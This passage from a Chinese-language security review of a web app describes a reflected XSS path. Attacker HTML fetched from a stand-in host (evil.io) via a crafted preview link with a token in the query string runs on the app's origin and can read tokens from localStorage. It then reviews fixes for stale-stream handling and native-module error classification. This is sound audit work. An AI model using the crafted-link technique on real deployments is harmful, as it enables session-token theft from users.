- 为什么不是"前端已 sandbox 就没事"：前端确实走了安全路径（`SourcesPanel.tsx:121-131` 用带 Authorization 头的 `fetch` 取 HTML，再以 `srcDoc` + `sandbox="allow-popups allow-popups-to-escape-sandbox"`（无 `allow-scripts`）渲染 → iframe 内不执行脚本）。**风险在同一个端点的第二条出口**：它是个 GET，返回 `text/html` 且允许 `?token=`。攻击者只需**自己注册一个账号拿到自己的 token**，构造 `https://<host>/api/web/preview?url=https://evil.io/p&token=<攻击者自己的token>` 发给受害者；顶层导航无 sandbox，脚本在我们自己的源上执行。生产部署按现有约定就是同源反代（前端调用写的是相对路径 `/api/web/preview`，dev 由 vite proxy 转发）→ 等价于应用源 XSS，可读取 localStorage 里的 access/refresh token。

## 6. 本轮修复的正确性复核（结论：方向对，几处我本来怀疑、核对后不成立）

- **desktop ③（idle 超时孤儿 run）**：新增 `terminateActiveRun` 把"渲染端 abort + transport.stop/chatService.stop"收敛成单点，并在两处 `onError` 终态调用。我最初判断这会在"旧流的 onError 迟到、用户已切会话开了新 run"时误杀新 run（`abortController` 是全局单例）——**核对后不成立**：`services/stream-handler.ts:147-149` 的 `isStale()` 同时比较 `mySeq !== getCurrentSeq()`，而新 run 在 `chatStore.ts:793/1168` 会 `++streamSeq`，`handleError` 入口 `:395` 即被拦截，压根不会回调到 store。新单测也断到了 `stopSpy('s1')` + `controller.signal.aborted`。

- **desktop ⑨（LocalChatStore 粘性失败）**：区分瞬时/永久的方向对，但 `isPermanentOpenError` 只认 `code === 'MODULE_NOT_FOUND'`（`local-store.ts:456-459`）偏窄：打包产物里 `.node` 缺失/ABI 不匹配通常是 `Error: The module … was compiled against a different Node.js version` 这类**没有 `code` 的错误对象**，会被判成"瞬时"从而每次调用都重试 + 刷日志。建议再按 `err.message` 兜一层（`MODULE_NOT_FOUND|ERR_MODULE_NOT_FOUND|compiled against|Could not locate the bindings`）。另 `:466` 成功分支里的 `_openError = null` 是死写（前面已有 `if (_openError) return null`）。
